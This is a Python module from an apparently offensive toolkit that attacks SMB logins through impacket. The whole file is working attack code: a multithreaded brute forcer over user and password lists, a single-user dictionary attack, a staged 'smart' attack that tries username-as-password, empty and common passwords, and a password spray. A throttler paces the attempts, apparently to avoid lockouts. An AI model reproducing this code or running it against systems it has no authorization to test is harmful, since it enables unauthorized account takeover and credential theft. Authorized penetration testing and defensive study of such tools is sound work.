"""
SMB Brute Force Module
Handles brute force attacks against SMB services.
"""

import time
import threading
import concurrent.futures
from impacket.smbconnection import SMBConnection
from utils.logger import get_logger


class BruteForceThrottler:
    """Throttling mechanism for brute force attacks."""
    
    def __init__(self, delay=0.0, max_attempts_per_minute=60):
        self.delay = delay
        self.max_attempts_per_minute = max_attempts_per_minute
        self.attempts = []
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        """Wait if throttling is needed."""
        with self.lock:
            current_time = time.time()
            
            # Remove attempts older than 1 minute
            self.attempts = [t for t in self.attempts if current_time - t < 60]
            
            # Check if we need to wait
            if len(self.attempts) >= self.max_attempts_per_minute:
                sleep_time = 60 - (current_time - self.attempts[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    self.attempts = []
            
            # Add current attempt
            self.attempts.append(current_time)
            
            # Basic delay between attempts
            time.sleep(self.delay)


def test_smb_login(target, username, password, port=445, timeout=10):
    """
    Test SMB login with given credentials.
    
    Args:
        target (str): Target IP or hostname
        username (str): Username to test
        password (str): Password to test
        port (int): SMB port
        timeout (int): Connection timeout
    
    Returns:
        bool: True if login successful
    """
    smb_conn = None
    
    try:
        smb_conn = SMBConnection(target, target, sess_port=port, timeout=timeout)
        smb_conn.login(username, password)
        return True
    except Exception:
        return False
    finally:
        if smb_conn:
            try:
                smb_conn.close()
            except:
                pass


def smb_brute_force(target, userlist_file, passlist_file, port=445, logger=None, max_workers=5, delay=0):
    """
    Perform SMB brute force attack.
    
    Args:
        target (str): Target IP or hostname
        userlist_file (str): Path to username list file
        passlist_file (str): Path to password list file
        port (int): SMB port
        logger: Logger instance
        max_workers (int): Maximum number of worker threads
    
    Returns:
        list: List of valid credential tuples (username, password, None)
    """
    if logger is None:
        logger = get_logger()
    
    valid_creds = []
    throttler = BruteForceThrottler()
    
    try:
        # Read username list
        with open(userlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        
        # Read password list
        with open(passlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        logger.info(f"[*] Starting brute force: {len(usernames)} users x {len(passwords)} passwords")
        logger.info(f"[*] Total attempts: {len(usernames) * len(passwords)}")
        if delay > 0:
            logger.info(f"[*] Delay between attempts: {delay} seconds")
        else:
            logger.info(f"[*] No delay configured - maximum speed attack")
        
        def try_credential(cred_pair):
            """Try a single credential pair."""
            username, password = cred_pair
            
            # Apply throttling
            throttler.wait_if_needed()
            
            try:
                if test_smb_login(target, username, password, port):
                    logger.info(f"[+] Valid credentials found: {username}:{password}")
                    return (username, password, None)
                else:
                    logger.debug(f"[-] Failed: {username}:{password}")
                    return None
            except Exception as e:
                logger.debug(f"[-] Error testing {username}:{password} - {str(e)}")
                return None
        
        # Generate credential pairs
        credential_pairs = [(u, p) for u in usernames for p in passwords]
        
        # Use ThreadPoolExecutor for concurrent attempts
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_creds = {executor.submit(try_credential, cred_pair): cred_pair 
                              for cred_pair in credential_pairs}
            
            # Process completed tasks
            completed = 0
            for future in concurrent.futures.as_completed(future_to_creds):
                completed += 1
                
                if completed % 50 == 0:
                    logger.info(f"[*] Progress: {completed}/{len(credential_pairs)} attempts completed")
                
                try:
                    result = future.result()
                    if result:
                        valid_creds.append(result)
                except Exception as e:
                    logger.debug(f"[-] Future error: {str(e)}")
        
        logger.info(f"[*] Brute force completed. Found {len(valid_creds)} valid credential(s)")
        
    except FileNotFoundError as e:
        logger.error(f"[-] File not found: {str(e)}")
    except Exception as e:
        logger.error(f"[-] Brute force error: {str(e)}")
    
    return valid_creds


def dictionary_attack(target, username, passlist_file, port=445, logger=None):
    """
    Perform dictionary attack against a specific username.
    
    Args:
        target (str): Target IP or hostname
        username (str): Target username
        passlist_file (str): Path to password list file
        port (int): SMB port
        logger: Logger instance
    
    Returns:
        tuple: Valid credentials if found, None otherwise
    """
    if logger is None:
        logger = get_logger()
    
    throttler = BruteForceThrottler()
    
    try:
        # Read password list
        with open(passlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        logger.info(f"[*] Dictionary attack on user '{username}' with {len(passwords)} passwords")
        
        for i, password in enumerate(passwords):
            # Apply throttling
            throttler.wait_if_needed()
            
            if i % 100 == 0 and i > 0:
                logger.info(f"[*] Progress: {i}/{len(passwords)} passwords tested")
            
            try:
                if test_smb_login(target, username, password, port):
                    logger.info(f"[+] Valid credentials found: {username}:{password}")
                    return (username, password, None)
                else:
                    logger.debug(f"[-] Failed: {username}:{password}")
            except Exception as e:
                logger.debug(f"[-] Error testing {username}:{password} - {str(e)}")
                continue
        
        logger.info(f"[-] Dictionary attack completed. No valid password found for '{username}'")
        
    except FileNotFoundError as e:
        logger.error(f"[-] Password list file not found: {str(e)}")
    except Exception as e:
        logger.error(f"[-] Dictionary attack error: {str(e)}")
    
    return None


def smart_brute_force(target, userlist_file, passlist_file, port=445, logger=None):
    """
    Smart brute force that tries common username/password combinations first.
    
    Args:
        target (str): Target IP or hostname
        userlist_file (str): Path to username list file
        passlist_file (str): Path to password list file
        port (int): SMB port
        logger: Logger instance
    
    Returns:
        list: List of valid credential tuples
    """
    if logger is None:
        logger = get_logger()
    
    valid_creds = []
    throttler = BruteForceThrottler()
    
    try:
        # Read username and password lists
        with open(userlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        
        with open(passlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        logger.info(f"[*] Smart brute force attack starting...")
        
        # Phase 1: Try common combinations (username = password)
        logger.info("[*] Phase 1: Testing username=password combinations")
        for username in usernames:
            throttler.wait_if_needed()
            
            try:
                if test_smb_login(target, username, username, port):
                    creds = (username, username, None)
                    valid_creds.append(creds)
                    logger.info(f"[+] Valid credentials found (same): {username}:{username}")
            except Exception as e:
                logger.debug(f"[-] Error testing {username}:{username} - {str(e)}")
        
        # Phase 2: Try empty passwords
        logger.info("[*] Phase 2: Testing empty passwords")
        for username in usernames:
            throttler.wait_if_needed()
            
            try:
                if test_smb_login(target, username, "", port):
                    creds = (username, "", None)
                    valid_creds.append(creds)
                    logger.info(f"[+] Valid credentials found (empty): {username}:(empty)")
            except Exception as e:
                logger.debug(f"[-] Error testing {username}:(empty) - {str(e)}")
        
        # Phase 3: Try top common passwords for each user
        common_passwords = ['password', '123456', 'admin', 'root', 'guest', 'Password1']
        logger.info("[*] Phase 3: Testing common passwords")
        
        for username in usernames:
            for password in common_passwords:
                throttler.wait_if_needed()
                
                try:
                    if test_smb_login(target, username, password, port):
                        creds = (username, password, None)
                        valid_creds.append(creds)
                        logger.info(f"[+] Valid credentials found (common): {username}:{password}")
                except Exception as e:
                    logger.debug(f"[-] Error testing {username}:{password} - {str(e)}")
        
        # Phase 4: Full brute force if no credentials found
        if not valid_creds:
            logger.info("[*] Phase 4: Full brute force attack")
            return smb_brute_force(target, userlist_file, passlist_file, port, logger)
        
        logger.info(f"[*] Smart brute force completed. Found {len(valid_creds)} valid credential(s)")
        
    except Exception as e:
        logger.error(f"[-] Smart brute force error: {str(e)}")
    
    return valid_creds


def password_spray(target, userlist_file, passlist_file, port=445, logger=None, delay=1):
    """
    Password spray attack - tests each password against all users before moving to next password.
    
    Args:
        target (str): Target IP/hostname
        userlist_file (str): Path to username list file
        passlist_file (str): Path to password list file
        port (int): SMB port (default: 445)
        logger: Logger instance
        delay (int): Delay between attempts in seconds
        
    Returns:
        list: List of successful credentials found
    """
    if logger:
        logger.info(f"[*] Starting password spray attack against {target}")
    
    try:
        # Load usernames
        with open(userlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
            
        # Load passwords  
        with open(passlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        if not usernames or not passwords:
            if logger:
                logger.error("[-] Username or password list is empty")
            return []
            
        found_creds = []
        throttler = BruteForceThrottler(delay)
        
        # For each password, test against all usernames
        for password in passwords:
            if logger:
                logger.info(f"[*] Testing password: {password}")
                
            for username in usernames:
                throttler.wait_if_needed()
                
                success = test_smb_login(target, username, password, port)
                
                if success:
                    cred = (username, password, None)
                    found_creds.append(cred)
                    if logger:
                        logger.info(f"[+] Valid credentials: {username}:{password}")
                        
        if logger:
            logger.info(f"[*] Password spray complete. Found {len(found_creds)} valid credentials")
            
        return found_creds
        
    except FileNotFoundError as e:
        if logger:
            logger.error(f"[-] File not found: {e}")
    except Exception as e:
        if logger:
            logger.error(f"[-] Error during password spray: {e}")
    
    return []
